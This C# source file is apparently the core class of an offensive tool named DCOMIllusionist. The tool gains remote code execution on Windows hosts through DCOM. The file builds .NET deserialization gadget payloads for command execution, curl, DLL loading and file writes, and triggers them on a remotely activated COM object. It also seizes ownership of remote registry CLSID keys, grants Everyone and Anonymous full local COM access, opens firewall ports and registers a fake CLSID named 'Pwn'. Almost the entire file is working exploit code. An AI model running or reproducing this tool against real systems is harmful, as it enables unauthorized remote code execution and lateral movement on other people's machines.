using DCOMIllusionist.Core.COM;
using DCOMIllusionist.Core.COM.Marshaling;
using DCOMIllusionist.Core.COM.Marshalling;
using DCOMIllusionist.Core.Generators;
using DCOMIllusionist.Core.Helpers;
using DCOMIllusionist.Core.Interop;
using DCOMIllusionist.Core.Interop.Interfaces;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Claims;

namespace DCOMIllusionist.Core
{
    public class Illusionist
    {
        private Options _options;
        private Registry _localRegistry;
        private Registry _remoteRegistry;

        const int COM_RIGHTS_ACCESS_EXECUTE = 0x1;
        const int COM_RIGHTS_ACCESS_EXECUTE_LOCAL = 0x2;
        const int COM_RIGHTS_ACCESS_EXECUTE_REMOTE = 0x4;

        const int COM_RIGHTS_LAUNCH_EXECUTE = 0x1;
        const int COM_RIGHTS_LAUNCH_EXECUTE_LOCAL = 0x2;
        const int COM_RIGHTS_LAUNCH_EXECUTE_REMOTE = 0x4;
        const int COM_RIGHTS_LAUNCH_ACTIVATE_LOCAL = 0x8;
        const int COM_RIGHTS_LAUNCH_ACTIVATE_REMOTE = 0x10;

        const int COM_RIGHTS_ACCESS_FULL = COM_RIGHTS_ACCESS_EXECUTE | COM_RIGHTS_ACCESS_EXECUTE_LOCAL | COM_RIGHTS_ACCESS_EXECUTE_REMOTE;
        const int COM_RIGHTS_LAUNCH_FULL = COM_RIGHTS_LAUNCH_EXECUTE | COM_RIGHTS_LAUNCH_EXECUTE_LOCAL | COM_RIGHTS_LAUNCH_EXECUTE_REMOTE | COM_RIGHTS_LAUNCH_ACTIVATE_LOCAL | COM_RIGHTS_LAUNCH_ACTIVATE_REMOTE;

        private SecurityIdentifier[] sids = new[]
        {
            new SecurityIdentifier(WellKnownSidType.AnonymousSid, null),
            new SecurityIdentifier(WellKnownSidType.WorldSid, null)
        };

        private readonly string[] defaultLocalDCOMKeys = { "DefaultAccessPermission", "MachineAccessRestriction" };
        private List<int> _portsToClose = new List<int>();

        public Illusionist(Options options)
        {
            _options=options;
            Console.CancelKeyPress += OnExit;
        }

        private void OnExit(object sender, ConsoleCancelEventArgs e)
        {
            Log.Warn("Ctrl+C pressed! Cleaning up...");
            CleanUp();
        }

        // Everything happens here
        public void Exploit()
        {
            try
            {
                Log.Debug("Starting exploit");

                IGenerator generator = CreateGenerator();
                if (!CheckSelectedExploit(generator)) return;

                object payload = GetPayloadFromGenerator(generator);

                if (!_options.SkipLocalRegistrySetup)
                    SetupLocalRegistry();
                if (!_options.SkipRemoteRegistrySetup)
                    SetupRemoteRegistry();

                IObject remoteObject = (IObject)InstanciateRemoteCLSIDObject();

                InitializeRpcServer();

                OpenFirewallPorts();
                if (_options.CheckPort && !CheckConnectBack(remoteObject)) return;

                Log.Info("Triggering exploit");
                remoteObject.Equals(ObjectToStdMarshaller(payload));
                Log.Info("Success");


            }
            catch (Exception ex)
            {
                Log.Error(ex.Message);
                if (_options.Debug)
                    Console.WriteLine(ex.StackTrace);
            }
            finally
            {
                CleanUp();
            }
        }

        private void InitializeRpcServer()
        {
            NativeMethods.RpcServerUseProtseqEp("ncacn_ip_tcp", 20, _options.ListenPort, IntPtr.Zero);
        }

        private bool CheckSelectedExploit(IGenerator generator)
        {
            if (generator.IsExploitSupported(_options.ExploitType)) return true;

            string supported = string.Join(", ", generator.SupportedExploits().Select(e => e.ToString()));
            Log.Error($"{generator.GetType().Name.Replace("Generator", "")} gadget only supports the following exploit types:\n\t- {supported}");
            return false;
        }

        private bool CheckConnectBack(IObject remoteObject)
        {
            if (SendDummyObject(remoteObject))
            {
                Log.Debug("Got connect back from remote server.");
                return true;
            }

            Log.Error($"No connect back from server {_options.Target} on port {_options.ListenPort}, try another with --port option.");
            return false;
        }

        private Boolean SendDummyObject(IObject remoteObject)
        {
            try
            {
                var res = remoteObject.Equals(ObjectToStdMarshaller(new Hashtable()));
                return res.Equals(false);
            }
            catch (COMException ex) when ((uint)ex.HResult == 0x800706BA)
            {
                return false;
            }
        }

        private StdMarshaller ObjectToStdMarshaller(object localObject)
        {
            var ba = COMUtilities.MarshalledObjectWithMoniker(localObject);
            COMObjRefStandard std = (COMObjRefStandard)COMObjRef.FromArray(ba);

            // from observation in wireshark
            std.Iid = COMKnownGuids.IID_IDispatch;

            std.StringBindings.Clear();
            std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, _options.Listen));

            return new StdMarshaller(std);
        }

        private object InstanciateRemoteCLSIDObject()
        {
            var pComAct = (IStandardActivator)new StandardActivator();
            var IID_IStandardActivator = typeof(IStandardActivator).GUID;

            // https://blog.exatrack.com/STUBborn/
            // the CLSID_ComActivator is an internal CLSID not exposed in the registry
            var result2 = NativeMethods.CoCreateInstance(ref COMKnownGuids.CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);

            pComAct = (IStandardActivator)instance;
            ISpecialSystemPropertiesActivator props = (ISpecialSystemPropertiesActivator)instance;

            if (!string.IsNullOrEmpty(_options.Session))
            {
                var session = Convert.ToInt32(_options.Session);
                Log.Debug($"Trying to trigger exploit from session {session}");
                props.SetSessionId(session, 0, 1);
            }

            MULTI_QI[] qis = new MULTI_QI[1];
            qis[0] = new MULTI_QI(COMKnownGuids.IID_IUnknown);

            var c = new COSERVERINFO(_options.Target);

            Guid clsid = new Guid(_options.CLSID);
            pComAct.StandardCreateInstance(clsid, IntPtr.Zero, CLSCTX.REMOTE_SERVER, c, 1, qis);

            return qis[0].GetObject();
        }

        private object GetPayloadFromGenerator(IGenerator generator)
        {
            switch (_options.ExploitType)
            {
                case ExploitType.Exec:
                    return generator.GenerateExec(_options.Arg);

                case ExploitType.Curl:
                    return generator.GenerateCurl(_options.Arg);

                case ExploitType.LoadDLL:
                    return generator.GenerateLoadDLL(_options.Arg);

                case ExploitType.B64Ysoserial:
                    return generator.GenerateB64Ysoserial(_options.Arg);

                case ExploitType.FileWrite:
                    return generator.GenerateFileWrite(_options.Arg);

                default:
                    Log.Error("Invalid exploit type.");
                    throw new InvalidOperationException("Unsupported ExploitType: " + _options.ExploitType);
            }
        }

        private IGenerator CreateGenerator()
        {
            if (!string.IsNullOrEmpty(_options.Gadget))
                return CreateGeneratorByName(_options.Gadget);

            return CreateGeneratorByExploitType(_options.ExploitType);
        }

        private IGenerator CreateGeneratorByExploitType(ExploitType exploitType)
        {
            switch (exploitType)
            {
                case ExploitType.Exec:
                    return new TextFormattingRunPropertiesGenerator();

                case ExploitType.Curl:
                    return new TextFormattingRunPropertiesGenerator();

                case ExploitType.LoadDLL:
                    return new TextFormattingRunPropertiesGenerator();

                case ExploitType.FileWrite:
                    return new TextFormattingRunPropertiesGenerator();

                case ExploitType.B64Ysoserial:
                    return new RolePrincipalGenerator();

                default:
                    Log.Error("Invalid exploit type.");
                    throw new InvalidOperationException("Unsupported ExploitType: " + _options.ExploitType);
            }
        }

        private IGenerator CreateGeneratorByName(string name)
        {
            Log.Debug("Creating gadget");
            var types = AppDomain.CurrentDomain
                                 .GetAssemblies()
                                 .SelectMany(s => s.GetTypes());

            var generatorType = types.FirstOrDefault(t =>
                typeof(IGenerator).IsAssignableFrom(t) &&
                !t.IsInterface &&
                !t.IsAbstract &&
                string.Equals(t.Name.Replace("Generator", ""), name, StringComparison.OrdinalIgnoreCase));

            if (generatorType == null)
                throw new InvalidOperationException($"Generator not found: '{name}'");

            return (IGenerator)Activator.CreateInstance(generatorType);
        }

        private void SetLocalRegistryAccessPermissions()
        {
            if (!CheckComAccessPermissions())
            {
                try
                {
                    SetComAccessPermissions();
                }
                catch (Exception ex)
                {
                    Log.Error("Fail to modify local registry, retry with elevated shell.");
                    Log.Error(ex.Message);
                    if (_options.Debug)
                        Log.Error(ex.Message);
                    Environment.Exit(1);
                }
            }
        }

        private Boolean CheckComAccessPermissions()
        {
            Log.Debug("Checking local COM access permissions");
            foreach (var key in defaultLocalDCOMKeys)
            {
                foreach (var sid in sids)
                {
                    if (!CheckComAccessPermissionsForSid(key, sid, COM_RIGHTS_ACCESS_FULL))
                        return false;
                }
            }

            return true;
        }

        private Boolean SetComAccessPermissions()
        {
            Log.Info("Modifying default local COM access permissions");
            foreach (var key in defaultLocalDCOMKeys)
            {
                foreach (var sid in sids)
                {
                    SetComAccessPermissionsForSid(key, sid, COM_RIGHTS_ACCESS_FULL);
                }
            }

            return true;
        }

        private Boolean CheckComAccessPermissionsForSid(string keyName, SecurityIdentifier sid, int accessRight)
        {
            var sd = _localRegistry.getSecurityDescriptorFromKey(keyName);
            if (sd == null)
                return false;

            return sd.DiscretionaryAcl
                 .OfType<CommonAce>()
                 .Any(ace => ace.AceType == AceType.AccessAllowed &&
                             ace.SecurityIdentifier.Value == sid.Value &&
                             ace.AccessMask == accessRight);
        }

        private void SetComAccessPermissionsForSid(string keyName, SecurityIdentifier sid, int acessRight)
        {
            var sd = _localRegistry.getSecurityDescriptorFromKey(keyName);
            if (sd == null)
                sd = new CommonSecurityDescriptor(false, false, ControlFlags.None, sid, sid, null, null);

            DiscretionaryAcl dacl = sd.DiscretionaryAcl;
            dacl.SetAccess(AccessControlType.Allow, sid, acessRight, InheritanceFlags.None, PropagationFlags.None);

            byte[] modifiedSd = new byte[sd.BinaryLength];
            sd.GetBinaryForm(modifiedSd, 0);
            _localRegistry.SetRegKeyValue(keyName, modifiedSd);
        }

        // Debug code
        private void DisplayComAccessPermissions(Registry registry, string keyName)
        {
            var sd = registry.getSecurityDescriptorFromKey(keyName);

            if (sd == null)
            {
                Log.Info($"Key {keyName} not found.");
                return;
            }

            Log.Info($"Com access permission for: {keyName}");
            foreach (CommonAce ace in sd.DiscretionaryAcl)
            {
                string account;
                try
                {
                    account = ace.SecurityIdentifier.Translate(typeof(NTAccount)).ToString();
                }
                catch
                {
                    account = ace.SecurityIdentifier.Value;
                }

                string type = ace.AceType == AceType.AccessAllowed ? "Allow" :
                                ace.AceType == AceType.AccessDenied ? "Deny" : ace.AceType.ToString();

                string rights = InterpretDcomRights(ace.AccessMask);

                Console.WriteLine($"  {type,-6} {account,-25} : {rights} (0x{ace.AccessMask:X})");
            }
        }

        // Debug code
        private static string InterpretDcomRights(int mask)
        {
            var rights = new List<string>();
            if ((mask & COM_RIGHTS_ACCESS_EXECUTE_LOCAL) != 0) rights.Add("Local Access");
            if ((mask & COM_RIGHTS_ACCESS_EXECUTE_REMOTE) != 0) rights.Add("Remote Access");

            return rights.Count > 0 ? string.Join(", ", rights) : $"Unknown (0x{mask:X})";
        }

        private void RestoreRegistries()
        {
            if (_localRegistry == null && _remoteRegistry == null)
                return;

            Log.Info("Restoring registries modifications");
            /*  
                if target is localhost we don't stop the service if it was stopped
                otherwise the "remote" modifications won't be restored
            */
            bool restoreLocalState = !Utils.IsLocalhost(_options.Target);

            _localRegistry?.Restore(restoreLocalState);
            _remoteRegistry?.Restore();
        }

        private void SetupRemoteRegistry()
        {
            Log.Info("Modifying remote registry");
            HKEY rootKey = _options.Hku ? HKEY.HKEY_USERS : HKEY.HKEY_LOCAL_MACHINE;

            string keyPath = $@"SOFTWARE\Classes\CLSID\{{{_options.CLSID}}}";
            if (_options.Hku)
            {
                keyPath = _options.AttackerSID + @"\" + keyPath;
            }
            _remoteRegistry = new Registry(_options.Target, keyPath, rootKey);
            _remoteRegistry.Initialize();

            SecurityIdentifier attackerSid;
            if (!string.IsNullOrEmpty(_options.AttackerSID))
            {
                attackerSid = new SecurityIdentifier(_options.AttackerSID);
            }
            else
            {
                attackerSid = WindowsIdentity.GetCurrent().User;
            }

            // assume that if we modify HKEY_USERS we already have full control
            if (!_options.Hku)
            {
                _remoteRegistry.SetOwnership(attackerSid);
                _remoteRegistry.GrantFullControl(attackerSid);
            }
            _remoteRegistry.ReopenKeyWithFullPerms();

            Log.Debug("Modifying AppId");
            _remoteRegistry.SetRegKeyValue("AppID", $"{{{_options.AppId}}}");

        }

        private void SetupLocalRegistry()
        {
            _localRegistry = new Registry(@"SOFTWARE\Microsoft\Ole");
            _localRegistry.Initialize(RegistryRights.FullControl);

            SetLocalRegistryAccessPermissions();
        }

        private void OpenFirewallPorts()
        {
            // no need if target is localhost
            if (Utils.IsLocalhost(_options.Target))
                return;

            var ports = new[] { 135, int.Parse(_options.ListenPort) };

            foreach (var port in ports.Where(p => !Firewall.IsPortOpen(p)))
            {
                _portsToClose.Add(port);
                Firewall.OpenPort(port);
            }
        }

        private void CloseFirewallPorts()
        {
            _portsToClose.ForEach(Firewall.ClosePort);
        }

        public void CleanUp()
        {
            CloseFirewallPorts();
            RestoreRegistries();
        }

        public void RestoreRegistryBackup()
        {
            Log.Info("Restoring registry modifications");
            Registry reg = Registry.LoadRegistryInfoFromJson(_options.RestoreRegistryBackup);
            reg.Restore();
            Log.Info("Done.");
        }

        public void ModifyLocalRegistry()
        {
            try
            {
                SetupLocalRegistry();
            }
            catch (Exception ex)
            {
                Log.Error(ex.Message);
                if (_options.Debug)
                    Console.WriteLine(ex.StackTrace);
            }
            finally
            {
                _localRegistry.SaveRegistryInfoToJson();
            }
        }

        public void ModifyRemoteRegistry()
        {
            try
            {
                SetupRemoteRegistry();
            }
            catch (Exception ex)
            {
                Log.Error(ex.Message);
                if (_options.Debug)
                    Console.WriteLine(ex.StackTrace);
            }
            finally
            {
                _remoteRegistry.SaveRegistryInfoToJson();
            }
        }

        public void TestNetwork()
        {
            try
            {
                Log.Info("Checking network access");

                if (!_options.SkipLocalRegistrySetup)
                    SetupLocalRegistry();
                if (!_options.SkipRemoteRegistrySetup)
                    SetupRemoteRegistry();

                IObject remoteObject = (IObject)InstanciateRemoteCLSIDObject();

                InitializeRpcServer();

                OpenFirewallPorts();
                if (CheckConnectBack(remoteObject))
                {
                    Log.Info("Success");
                }
                else
                {
                    Log.Info("Fail");
                }

            }
            catch (Exception ex)
            {
                Log.Error(ex.Message);
                if (_options.Debug)
                    Log.Error(ex.StackTrace);
            }
            finally
            {
                CloseFirewallPorts();
                RestoreRegistries();
            }
        }

        public void DisplayRemoteSessions()
        {
            var enumerator = new RemoteSessionEnumerator(_options.Target);

            try
            {
                Log.Info("Enumerating sessions");
                var sessions = new List<SessionInfo>(enumerator.EnumerateSessions());

                if (sessions.Count == 0)
                {
                    Log.Info("No remote sessions found.");
                }
                else
                {
                    foreach (var session in sessions)
                    {
                        Console.WriteLine($"  - {session}");
                    }
                }
            }
            catch (Exception ex)
            {
                Log.Error(ex.Message);
                if (_options.Debug)
                    Log.Error(ex.StackTrace);
            }
            finally
            {
                enumerator.Close();
            }
        }

        private void SetupRemoteRegistryForCLSIDCreation()
        {
            Log.Debug("Setting up remote registry for CLSID creation");
            HKEY rootKey = _options.Hku ? HKEY.HKEY_USERS : HKEY.HKEY_LOCAL_MACHINE;

            string keyPath = $@"Software\Classes";
            if (_options.Hku)
            {
                keyPath = _options.AttackerSID + @"\" + keyPath;
            }

            _remoteRegistry = new Registry(_options.Target, keyPath, rootKey, false);
            _remoteRegistry.Initialize(RegistryRights.ReadKey|RegistryRights.CreateSubKey|RegistryRights.SetValue);
        }

        public string CreateNewAppId()
        {
            Log.Debug("Adding new AppId");

            string appId = "{900f081a-a69d-4a92-9f33-72c141feee9a}";

            SecurityIdentifier attackerSid;
            if (!string.IsNullOrEmpty(_options.AttackerSID))
            {
                attackerSid = new SecurityIdentifier(_options.AttackerSID);
            }
            else
            {
                attackerSid = WindowsIdentity.GetCurrent().User;
            }

            RegistryKey customAppId = _remoteRegistry.CreateSubKey("AppID").CreateSubKey(appId);
            Log.Info($"New AppId: {appId}");
            customAppId.SetValue("", "");
            customAppId.SetValue("DllSurrogate", "");

            SetSdInRegValue(customAppId, "LaunchPermission", attackerSid, COM_RIGHTS_LAUNCH_FULL);
            SetSdInRegValue(customAppId, "AccessPermission", attackerSid, COM_RIGHTS_ACCESS_FULL);

            return appId;
        }

        private void SetSdInRegValue(RegistryKey key, string name, SecurityIdentifier sid, int permission)
        {
            // Read existing binary SD if present
            byte[] existingSd = key.GetValue(name, null) as byte[];
            CommonSecurityDescriptor sd;

            if (existingSd != null)
            {
                sd = new CommonSecurityDescriptor(false, false, existingSd, 0);
            }
            else
            {
                // Create a new empty security descriptor
                sd = new CommonSecurityDescriptor(false, false, ControlFlags.None, sid, sid, null, null);
            }

            DiscretionaryAcl dacl = sd.DiscretionaryAcl ?? new DiscretionaryAcl(false, false, 1);
            dacl.SetAccess(AccessControlType.Allow, sid, permission, InheritanceFlags.None, PropagationFlags.None);
            sd.DiscretionaryAcl = dacl;

            // Convert back to binary
            byte[] modifiedSd = new byte[sd.BinaryLength];
            sd.GetBinaryForm(modifiedSd, 0);

            // Write back to registry
            key.SetValue(name, modifiedSd, RegistryValueKind.Binary);
        }

        public void CreateNewCLSID(string appId)
        {
            Log.Debug("Adding new CLSID");

            string CLSID = "{1f0dd70c-df30-4b47-8ac4-f72aba8bff24}";
            string name = "Pwn";

            RegistryKey customCLSID = _remoteRegistry.CreateSubKey("CLSID").CreateSubKey(CLSID);
            Log.Info($"New CLSID: {CLSID}");

            customCLSID.SetValue("", name);
            customCLSID.SetValue("AppId", appId);

            string assembly = "Microsoft.Transactions.Bridge, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";
            string className = "System.ServiceModel.Internal.TransactionBridge";
            string runtimeVersion = "v4.0.30319";
            string threadinModel = "Both";

            RegistryKey inprocServer32 = customCLSID.CreateSubKey("InprocServer32");
            inprocServer32.SetValue("", @"C:\Windows\System32\mscoree.dll");
            inprocServer32.SetValue("Assembly", assembly);
            inprocServer32.SetValue("Class", className);
            inprocServer32.SetValue("RuntimeVersion", runtimeVersion);
            inprocServer32.SetValue("ThreadinModel", threadinModel);
        }

        public void CreateFakeCLSID()
        {
            Log.Info("Creating fake CLSID");
            SetupRemoteRegistryForCLSIDCreation();
            string appId = CreateNewAppId();
            CreateNewCLSID(appId);
        }
    }
}
